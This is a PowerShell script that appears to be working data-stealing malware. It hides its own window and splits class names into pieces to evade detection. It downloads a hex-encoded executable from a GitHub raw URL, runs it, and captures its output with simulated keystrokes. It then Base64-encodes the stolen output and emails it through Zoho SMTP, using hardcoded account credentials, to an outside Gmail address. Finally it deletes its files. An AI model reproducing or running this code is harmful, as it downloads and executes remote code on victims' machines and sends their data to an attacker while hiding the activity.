# --- 0. START DIAGNOSTIC LOGGING ---
# $v_log = "$env:TEMP\debug_$(Get-Random).txt"
# Start-Transcript -Path $v_log -Append

try {
    $v_ms = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
    $v_type = Add-Type -MemberDefinition $v_ms -Name "W32S" -Namespace "W3" -PassThru
    $v_type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

    $v_sc = ("Net.M" + "ail.Smtp" + "Client")
    $v_mm = ("Net.M" + "ail.Mail" + "Message")

    function Send-V-Mail {
        param($sb, $at)
        $u = "zqrvstef0rc5edk@zohomail.com"
        $p = "LHjzKTbzDApt" 

        try {
            $m = New-Object $v_mm
            $m.From = "Ang Mangagawa <$u>"
            $m.To.Add("srve650@gmail.com")
            $m.Subject = $sb
            $m.Body = "Ang iyong mga aanihin."
            if ($at) { $m.Attachments.Add($at) }

            $c = New-Object $v_sc("smtp.zoho.com", 587)
            $c.EnableSsl = $true
            $c.Timeout = 15000
            $c.Credentials = New-Object System.Net.NetworkCredential($u, $p)
            
            Write-Output "Sending encoded data..."
            $c.Send($m)
            Write-Output "Success!"
        }
        catch {
            Write-Output "SMTP Error: $($_.Exception.Message)"
        }
        finally {
            if ($m) { $m.Dispose() }
            if ($c) { $c.Dispose() }
        }
    }

    $u_url = ("ht" + "tps://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt")
    $r_nm = -join ((97..122) | Get-Random -Count 5 | % {[char]$_})
    $v_txt = "$env:TEMP\$r_nm.txt"
    $v_exe = "$env:TEMP\$r_nm.exe"

    Invoke-WebRequest -Uri $u_url -OutFile $v_txt

    $h_data = Get-Content $v_txt -Raw
    $b_data = [byte[]]::new($h_data.Length / 2)
    for ($i = 0; $i -lt $h_data.Length; $i += 2) {
        $b_data[$i / 2] = [convert]::ToByte($h_data.Substring($i, 2), 16)
    }
    [System.IO.File]::WriteAllBytes($v_exe, $b_data)

    $v_p = Start-Process $v_exe -PassThru
    $v_out = "$env:TEMP\ani_$r_nm.txt"

    Start-Sleep -Seconds 2
    Add-Type -AssemblyName ("System.Win" + "dows.Forms")
    
    $ws = New-Object -ComObject WScript.Shell
    $ws.AppActivate($v_p.Id)
    Start-Sleep -Milliseconds 500

    [System.Windows.Forms.SendKeys]::SendWait("^(a)")
    Start-Sleep -Milliseconds 800
    [System.Windows.Forms.SendKeys]::SendWait("^(s)")
    Start-Sleep -Seconds 2 
    [System.Windows.Forms.SendKeys]::SendWait("$v_out")
    Start-Sleep -Milliseconds 800
    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
    Start-Sleep -Milliseconds 800

    # --- 5. ENCODE & EXFIL ---
    if ($v_p) { Stop-Process -Id $v_p.Id -Force }
    
    if (Test-Path $v_out) {
        # READ RAW DATA
        $r_raw = Get-Content $v_out -Raw
        $currentDate = Get-Date -Format 'yyyy-MM-dd HH:mm'
        
        # --- BASE64 ENCODING START ---
        $v_bytes  = [System.Text.Encoding]::UTF8.GetBytes($r_raw)
        $v_base64 = [System.Convert]::ToBase64String($v_bytes)
        # --- BASE64 ENCODING END ---

        # WRITE ENCODED DATA TO MEMORY STREAM
        $ms = New-Object System.IO.MemoryStream
        $sw = New-Object System.IO.StreamWriter($ms)
        $sw.Write($v_base64) 
        $sw.Flush()
        $ms.Position = 0
        
        $v_at = New-Object Net.Mail.Attachment($ms, "anihan.txt")
        Send-V-Mail -sb "Ang pagaani sa bukirin - $currentDate" -at $v_at
        $v_at.Dispose()
    }

    Remove-Item $v_txt, $v_exe, $v_out -Force -ErrorAction SilentlyContinue
}
catch {
    Write-Warning "Critical Error: $($_.Exception.Message)"
}

# finally {
#     # Stop-Transcript
# }